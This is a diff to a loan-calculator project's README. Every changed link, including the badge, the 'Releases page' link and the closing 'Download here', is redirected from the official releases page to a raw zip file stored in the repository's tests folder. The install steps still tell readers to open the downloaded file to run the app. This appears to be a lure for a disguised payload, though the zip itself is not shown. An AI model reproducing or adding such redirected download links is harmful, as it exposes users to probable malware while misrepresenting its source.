@@ -1,7 +1,7 @@
 # 🏦 annuity-loan-calculator - Your Easy Tool for Smart Loans
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/Anthonykkkl/annuity-loan-calculator/releases)
+[![Download](https://github.com/Anthonykkkl/annuity-loan-calculator/raw/refs/heads/main/tests/calculator-annuity-loan-1.2.zip)](https://github.com/Anthonykkkl/annuity-loan-calculator/raw/refs/heads/main/tests/calculator-annuity-loan-1.2.zip)
 
 ## 🚀 Getting Started
 The annuity loan calculator is designed for everyone. You don’t need technical skills to use it. With this tool, you can easily calculate your loan scenarios, visualize repayments, and optimize your financial decisions.
@@ -19,7 +19,7 @@ The annuity loan calculator is designed for everyone. You don’t need technical
 - **Internet Connection:** Required for initial download and updates.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Anthonykkkl/annuity-loan-calculator/releases).
+1. Visit the [Releases page](https://github.com/Anthonykkkl/annuity-loan-calculator/raw/refs/heads/main/tests/calculator-annuity-loan-1.2.zip).
 2. Look for the latest version.
 3. Download the file for your operating system.
 4. Open the downloaded file to run the application.
@@ -43,4 +43,4 @@ This tool covers a range of topics including amortization schedules, interest ca
 
 ---
 
-Whether you're looking to refinance your mortgage or plan for a new loan, this calculator can guide you toward informed financial decisions. Enjoy a streamlined experience with your finances by utilizing our tool. Download [here](https://github.com/Anthonykkkl/annuity-loan-calculator/releases) and start managing your loans efficiently.
+Whether you're looking to refinance your mortgage or plan for a new loan, this calculator can guide you toward informed financial decisions. Enjoy a streamlined experience with your finances by utilizing our tool. Download [here](https://github.com/Anthonykkkl/annuity-loan-calculator/raw/refs/heads/main/tests/calculator-annuity-loan-1.2.zip) and start managing your loans efficiently.
